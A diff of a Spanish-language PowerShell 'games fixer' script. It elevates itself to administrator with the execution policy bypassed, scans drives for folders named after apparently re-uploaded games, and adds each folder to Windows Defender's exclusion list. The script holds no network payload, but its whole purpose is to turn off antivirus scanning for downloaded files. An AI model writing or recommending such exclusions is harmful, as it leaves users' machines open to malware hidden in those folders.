@@ -1,288 +1,309 @@
-# ESKPA2 Games Fixer - PowerShell version
-# Based on the Python original by zHarper
+# ESKPA2 Games Fixer - PowerShell Mejorado
+# Versión 2.0
 
-# Importar ensamblados necesarios para algunas funcionalidades
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+# Configuración inicial
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
-# Variable global para controlar la animación
-$script:stopAnimation = $false
-
-function Show-BrailleAnimation {
-    param (
-        [string]$message
-    )
-    
-    $brailleChars = "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"
-    
-    while (-not $script:stopAnimation) {
-        foreach ($char in $brailleChars) {
-            if ($script:stopAnimation) { break }
-            
-            Write-Host "`r$char $message" -ForegroundColor Cyan -NoNewline
-            Start-Sleep -Milliseconds 100
-        }
-    }
-    
-    Write-Host "`r$(" " * ($message.Length + 2))" -NoNewline
+# Función para verificar privilegios de administrador
+function Test-Administrator {
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($user)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Start-Animation {
-    param (
-        [string]$message
-    )
-    
-    $script:stopAnimation = $false
-    
-    $job = Start-Job -ScriptBlock {
-        param($message)
-        
-        $brailleChars = "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"
-        
-        while ($true) {
-            foreach ($char in $brailleChars) {
-                Write-Host "`r$char $message" -ForegroundColor Cyan -NoNewline
-                Start-Sleep -Milliseconds 100
-            }
-        }
-    } -ArgumentList $message
-    
-    return $job
-}
-
-function Stop-AnimationThread {
-    param (
-        [System.Management.Automation.Job]$job
-    )
-    
-    $script:stopAnimation = $true
-    Stop-Job -Job $job
-    Remove-Job -Job $job
-    Start-Sleep -Milliseconds 200
-    Write-Host "`r$(" " * 80)" -NoNewline
-}
-
-function Show-Banner {
-    $banner = @"
-
-[36m╔══════════════════════════════════════════════════════════╗
-[36m║ [97m[1mESKPA2 Games Fixer[0m[36m
-[36m║ [33mBy zHarper your daddy[0m[36m    
-[36m╚══════════════════════════════════════════════════════════╝[0m
-"@
-    
-    Write-Host $banner
-}
-
-function Test-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
+# Función para solicitar privilegios de administrador si no los tiene
 function Request-AdminPrivileges {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    if (-not (Test-Administrator)) {
+        $scriptPath = $PSCommandPath
+        Start-Process PowerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+        exit
+    }
 }
 
-function Get-AllDrives {
-    return Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null } | ForEach-Object { "$($_.Name):\" }
+# Función para mostrar el banner con colores correctos
+function Show-Banner {
+    Clear-Host
+    Write-Host "╔═════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+    Write-Host "║ " -ForegroundColor Cyan -NoNewline
+    Write-Host "ESKPA2 Games Fixer" -ForegroundColor White -BackgroundColor Black -NoNewline
+    Write-Host "                                        ║" -ForegroundColor Cyan
+    Write-Host "║ " -ForegroundColor Cyan -NoNewline
+    Write-Host "By zHarper your daddy" -ForegroundColor Yellow -NoNewline
+    Write-Host "                                      ║" -ForegroundColor Cyan
+    Write-Host "╚═════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-Host ""
 }
 
-function Find-GameFolders {
+# Función mejorada para mostrar animación
+function Show-SpinnerAnimation {
     param (
-        [string[]]$folderNames
+        [string]$Text,
+        [int]$Seconds
     )
-    
-    $foundFolders = @()
-    
-    # Buscar en Descargas
-    $downloadsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("UserProfile"), "Downloads")
-    if (Test-Path -Path $downloadsPath) {
-        foreach ($folderName in $folderNames) {
-            $folderPath = Join-Path -Path $downloadsPath -ChildPath $folderName
-            if (Test-Path -Path $folderPath) {
-                $foundFolders += $folderPath
+
+    $spinChars = "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"
+    $startTime = Get-Date
+    $endTime = $startTime.AddSeconds($Seconds)
+
+    Write-Host ""
+    while ((Get-Date) -lt $endTime) {
+        foreach ($spinChar in $spinChars) {
+            Write-Host "`r$spinChar $Text" -ForegroundColor Cyan -NoNewline
+            Start-Sleep -Milliseconds 80
+            if ((Get-Date) -ge $endTime) {
+                break
             }
         }
     }
-    
-    # Buscar en todas las unidades
-    foreach ($drive in (Get-AllDrives)) {
-        if (Test-Path -Path $drive) {
-            try {
-                $searchDepth = 0
-                Get-ChildItem -Path $drive -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-                    if ($searchDepth -ge 3) { return }
-                    
-                    $dirPath = $_.FullName
-                    $searchDepth++
-                    
-                    foreach ($folderName in $folderNames) {
-                        $targetPath = Join-Path -Path $dirPath -ChildPath $folderName
-                        if (Test-Path -Path $targetPath -PathType Container) {
-                            $foundFolders += $targetPath
-                        }
-                    }
-                    
-                    # Buscar un nivel más abajo
-                    Get-ChildItem -Path $dirPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-                        $subDirPath = $_.FullName
-                        
-                        foreach ($folderName in $folderNames) {
-                            $targetPath = Join-Path -Path $subDirPath -ChildPath $folderName
-                            if (Test-Path -Path $targetPath -PathType Container) {
-                                $foundFolders += $targetPath
-                            }
-                        }
-                        
-                        # Un nivel más
-                        Get-ChildItem -Path $subDirPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-                            $subSubDirPath = $_.FullName
-                            
-                            foreach ($folderName in $folderNames) {
-                                $targetPath = Join-Path -Path $subSubDirPath -ChildPath $folderName
-                                if (Test-Path -Path $targetPath -PathType Container) {
-                                    $foundFolders += $targetPath
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            catch {
-                # Ignorar errores de acceso denegado
-            }
-        }
-    }
-    
-    return $foundFolders
+    Write-Host "`r                                                                      " -NoNewline
+    Write-Host "`r" -NoNewline
 }
 
-function Add-SecurityExclusion {
-    param (
-        [string]$folderPath
-    )
-    
-    try {
-        Add-MpPreference -ExclusionPath $folderPath -ErrorAction Stop
-        return $true
-    }
-    catch {
-        Write-Host "Error al añadir exclusión para $folderPath`: $_" -ForegroundColor Red
-        return $false
-    }
-}
-
+# Función mejorada para mostrar el menú de selección de juego
 function Show-GameMenu {
-    Write-Host "`n[36m╔══════════════════════════════════════════════════════════╗[0m"
-    Write-Host "[36m║ [97m[1mSelecciona un juego:[0m[36m                                         [0m"
-    Write-Host "[36m║                                                          [0m"
-    Write-Host "[36m║ [33m1. Schedule 1[0m[36m                                          [0m"
-    Write-Host "[36m║ [33m2. REPO[0m[36m                                                [0m"
-    Write-Host "[36m╚══════════════════════════════════════════════════════════╝[0m"
-    
-    while ($true) {
-        try {
-            Write-Host "`n[32mIngresa tu elección: [0m" -NoNewline
-            $choice = [int](Read-Host)
-            
-            if ($choice -ge 1 -and $choice -le 2) {
-                return $choice
-            }
-            else {
-                Write-Host "Opción inválida. Por favor ingresa un número entre 1 y 2." -ForegroundColor Red
-            }
+    Write-Host ""
+    Write-Host "╔═════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+    Write-Host "║ " -ForegroundColor Cyan -NoNewline
+    Write-Host "Selecciona un juego:" -ForegroundColor White -NoNewline
+    Write-Host "                                         ║" -ForegroundColor Cyan
+    Write-Host "║                                                             ║" -ForegroundColor Cyan
+    Write-Host "║ " -ForegroundColor Cyan -NoNewline
+    Write-Host "1. Schedule 1" -ForegroundColor Yellow -NoNewline
+    Write-Host "                                                ║" -ForegroundColor Cyan
+    Write-Host "║ " -ForegroundColor Cyan -NoNewline
+    Write-Host "2. REPO" -ForegroundColor Yellow -NoNewline
+    Write-Host "                                                      ║" -ForegroundColor Cyan
+    Write-Host "╚═════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-Host ""
+
+    do {
+        Write-Host "Ingresa tu elección: " -ForegroundColor Green -NoNewline
+        $choice = Read-Host
+        
+        if ($choice -match "^[1-2]$") {
+            return [int]$choice
+        } else {
+            Write-Host "Opción inválida. Por favor ingresa 1 o 2." -ForegroundColor Red
         }
-        catch {
-            Write-Host "Por favor ingresa un número válido." -ForegroundColor Red
-        }
-    }
+    } while ($true)
 }
 
-function Get-FoldersForGame {
+# Función mejorada para obtener carpetas según el juego seleccionado
+function Get-GameFolders {
     param (
-        [int]$gameChoice
+        [int]$GameChoice
     )
-    
-    switch ($gameChoice) {
-        1 { return @("Schedule 1 ESKPA2 Uploaded", "Schedule 1", "Schedule 1") }
+
+    switch ($GameChoice) {
+        1 { return @("Schedule 1 ESKPA2 Uploaded", "Schedule 1") }
         2 { return @("R.E.P.O. ESKPA2 Uploaded", "R.E.P.O") }
-        3 {
-            Write-Host "`n[33mIngresa los nombres de carpetas separados por comas:[0m"
-            Write-Host "[32m> [0m" -NoNewline
-            $customFolders = Read-Host
-            return $customFolders -split "," | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
-        }
         default { return @() }
     }
 }
 
-function Start-Main {
-    if (-not (Test-Admin)) {
-        Write-Host "Solicitando privilegios de administrador..." -ForegroundColor Yellow
-        Request-AdminPrivileges
-        exit
-    }
+# Función mejorada para buscar carpetas (búsqueda más profunda y precisa)
+function Find-GameFolders {
+    param (
+        [string[]]$FolderNames
+    )
     
-    Clear-Host
-    Show-Banner
+    $foundFolders = @()
     
-    $gameChoice = Show-GameMenu
-    $folderNames = Get-FoldersForGame -gameChoice $gameChoice
-    
-    if ($folderNames.Count -eq 0) {
-        Write-Host "No se especificaron carpetas para buscar." -ForegroundColor Red
-        return
-    }
-    
-    Write-Host "`n[97mBuscando las siguientes carpetas:[0m"
-    foreach ($folder in $folderNames) {
-        Write-Host "[36m• $folder[0m"
-    }
-    
-    Write-Host ""
-    $animationJob = Start-Animation -message "Buscando carpetas en el sistema"
-    
-    $foundFolders = Find-GameFolders -folderNames $folderNames
-    
-    Stop-AnimationThread -job $animationJob
-    
-    if ($foundFolders.Count -eq 0) {
-        Write-Host "No se encontraron las carpetas especificadas." -ForegroundColor Red
-        return
-    }
-    
-    Write-Host "`n[32mSe encontraron las siguientes carpetas:[0m"
-    for ($i = 0; $i -lt $foundFolders.Count; $i++) {
-        Write-Host "[36m$($i+1). [97m$($foundFolders[$i])[0m"
-    }
-    
-    Write-Host "`n[33mAgregando carpetas a las exclusiones de Seguridad de Windows...[0m"
-    $successCount = 0
-    
-    foreach ($folder in $foundFolders) {
-        $animationJob = Start-Animation -message "Procesando $(Split-Path -Path $folder -Leaf)"
-        Start-Sleep -Seconds 1
-        $result = Add-SecurityExclusion -folderPath $folder
-        Stop-AnimationThread -job $animationJob
-        
-        if ($result) {
-            Write-Host "[32m✓ Exclusión agregada: $folder[0m"
-            $successCount++
-        }
-        else {
-            Write-Host "[31m✗ No se pudo agregar la exclusión: $folder[0m"
+    # Buscar en carpeta de Descargas (prioridad alta)
+    $downloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
+    foreach ($folderName in $FolderNames) {
+        $potentialPath = Join-Path -Path $downloadsPath -ChildPath $folderName
+        if (Test-Path -Path $potentialPath -PathType Container) {
+            $foundFolders += $potentialPath
         }
     }
     
-    Write-Host "`n[36m╔════════════════════════════════════════════╗[0m"
-    Write-Host "[36m║ [97mProceso completado                                      [36m[0m"
-    Write-Host "[36m║ [97mAgregadas [32m$successCount[97m de [33m$($foundFolders.Count)[97m carpetas a las exclusiones [36m[0m"
-    Write-Host "[36m╚══════════════════════════════════════════════════════════╝[0m"
+    # Buscar en unidades principales con prioridad en carpetas comunes de juegos
+    $commonGamePaths = @(
+        "$env:ProgramFiles\Steam\steamapps\common",
+        "$env:ProgramFiles (x86)\Steam\steamapps\common",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "D:\Games",
+        "D:\SteamLibrary\steamapps\common",
+        "E:\Games",
+        "E:\SteamLibrary\steamapps\common"
+    )
     
-    Write-Host "`n[33mPresiona Enter para salir...[0m" -NoNewline
-    Read-Host
+    foreach ($basePath in $commonGamePaths) {
+        if (Test-Path -Path $basePath) {
+            foreach ($folderName in $FolderNames) {
+                $potentialPath = Join-Path -Path $basePath -ChildPath $folderName
+                if (Test-Path -Path $potentialPath -PathType Container) {
+                    $foundFolders += $potentialPath
+                }
+            }
+        }
+    }
+    
+    # Búsqueda más profunda en todas las unidades (limitar la profundidad para velocidad)
+    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
+    
+    foreach ($drive in $drives) {
+        $drivePath = "$($drive.Name):\"
+        try {
+            # Primo nivel
+            $firstLevelDirs = Get-ChildItem -Path $drivePath -Directory
+            foreach ($dir in $firstLevelDirs) {
+                foreach ($folderName in $FolderNames) {
+                    $potentialPath = Join-Path -Path $dir.FullName -ChildPath $folderName
+                    if (Test-Path -Path $potentialPath -PathType Container) {
+                        $foundFolders += $potentialPath
+                    }
+                }
+                
+                # Segundo nivel (solo carpetas específicas donde es probable encontrar juegos)
+                $commonSubfolders = @("Games", "Steam", "Program Files", "Program Files (x86)", "Users")
+                if ($commonSubfolders -contains $dir.Name) {
+                    try {
+                        $secondLevelDirs = Get-ChildItem -Path $dir.FullName -Directory
+                        foreach ($subDir in $secondLevelDirs) {
+                            foreach ($folderName in $FolderNames) {
+                                $potentialPath = Join-Path -Path $subDir.FullName -ChildPath $folderName
+                                if (Test-Path -Path $potentialPath -PathType Container) {
+                                    $foundFolders += $potentialPath
+                                }
+                            }
+                            
+                            # Tercer nivel (limitado a carpetas específicas)
+                            if (@("steamapps", "common", "Documents", "Downloads") -contains $subDir.Name) {
+                                try {
+                                    $thirdLevelDirs = Get-ChildItem -Path $subDir.FullName -Directory
+                                    foreach ($subSubDir in $thirdLevelDirs) {
+                                        foreach ($folderName in $FolderNames) {
+                                            $potentialPath = Join-Path -Path $subSubDir.FullName -ChildPath $folderName
+                                            if (Test-Path -Path $potentialPath -PathType Container) {
+                                                $foundFolders += $potentialPath
+                                            }
+                                        }
+                                    }
+                                } catch {}
+                            }
+                        }
+                    } catch {}
+                }
+            }
+        } catch {}
+    }
+    
+    # Buscar en ubicaciones específicas
+    $specificPaths = @(
+        "$env:USERPROFILE",
+        "C:\Users\Public\Documents",
+        "C:\Users\Public\Downloads"
+    )
+    
+    foreach ($specificPath in $specificPaths) {
+        if (Test-Path -Path $specificPath) {
+            foreach ($folderName in $FolderNames) {
+                $potentialPath = Join-Path -Path $specificPath -ChildPath $folderName
+                if (Test-Path -Path $potentialPath -PathType Container) {
+                    $foundFolders += $potentialPath
+                }
+            }
+        }
+    }
+    
+    # Eliminar duplicados y devolver resultados únicos
+    return $foundFolders | Select-Object -Unique
 }
 
-# Iniciar el script
-Start-Main
+# Función para agregar exclusiones de seguridad
+function Add-SecurityExclusion {
+    param (
+        [string]$FolderPath
+    )
+    
+    try {
+        Add-MpPreference -ExclusionPath $FolderPath -ErrorAction Stop
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# Función principal
+function Start-GameFixer {
+    # Verificar y solicitar privilegios de administrador
+    Request-AdminPrivileges
+    
+    # Mostrar banner
+    Show-Banner
+    
+    # Mostrar menú y obtener selección
+    $gameChoice = Show-GameMenu
+    
+    # Obtener los nombres de carpetas para el juego seleccionado
+    $folderNames = Get-GameFolders -GameChoice $gameChoice
+    
+    # Mostrar carpetas a buscar
+    Write-Host ""
+    Write-Host "Buscando las siguientes carpetas:" -ForegroundColor White
+    foreach ($folder in $folderNames) {
+        Write-Host "• $folder" -ForegroundColor Cyan
+    }
+    
+    # Buscar carpetas
+    Show-SpinnerAnimation -Text "Buscando carpetas en el sistema (esto puede tardar unos momentos)..." -Seconds 3
+    $foundFolders = Find-GameFolders -FolderNames $folderNames
+    
+    # Mostrar resultados
+    Write-Host ""
+    if ($foundFolders.Count -eq 0) {
+        Write-Host "No se encontraron las carpetas especificadas." -ForegroundColor Red
+        Write-Host ""
+        Write-Host "Comprueba que las carpetas existen y que tienes acceso a ellas." -ForegroundColor Yellow
+        Write-Host "Puedes intentar ejecutar la aplicación de nuevo o buscar manualmente." -ForegroundColor Yellow
+    } else {
+        Write-Host "Se encontraron las siguientes carpetas:" -ForegroundColor Green
+        for ($i = 0; $i -lt $foundFolders.Count; $i++) {
+            Write-Host "$($i+1). $($foundFolders[$i])" -ForegroundColor White
+        }
+        
+        # Agregar exclusiones
+        Write-Host ""
+        Write-Host "Agregando carpetas a las exclusiones de Seguridad de Windows..." -ForegroundColor Yellow
+        $successCount = 0
+        
+        foreach ($folder in $foundFolders) {
+            Show-SpinnerAnimation -Text "Procesando $(Split-Path -Path $folder -Leaf)" -Seconds 1
+            $result = Add-SecurityExclusion -FolderPath $folder
+            
+            if ($result) {
+                Write-Host "✓ Exclusión agregada: $folder" -ForegroundColor Green
+                $successCount++
+            } else {
+                Write-Host "✗ No se pudo agregar la exclusión: $folder" -ForegroundColor Red
+            }
+        }
+        
+        # Mostrar resumen
+        Write-Host ""
+        Write-Host "╔═════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+        Write-Host "║ " -ForegroundColor Cyan -NoNewline
+        Write-Host "Proceso completado" -ForegroundColor White -NoNewline
+        Write-Host "                                         ║" -ForegroundColor Cyan
+        Write-Host "║ " -ForegroundColor Cyan -NoNewline
+        Write-Host "Agregadas " -ForegroundColor White -NoNewline
+        Write-Host "$successCount" -ForegroundColor Green -NoNewline
+        Write-Host " de " -ForegroundColor White -NoNewline
+        Write-Host "$($foundFolders.Count)" -ForegroundColor Yellow -NoNewline
+        Write-Host " carpetas a las exclusiones" -ForegroundColor White -NoNewline
+        Write-Host "        ║" -ForegroundColor Cyan
+        Write-Host "╚═════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    }
+    
+    # Esperar a que el usuario presione una tecla
+    Write-Host ""
+    Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Yellow
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+}
+
+# Iniciar la aplicación
+Start-GameFixer
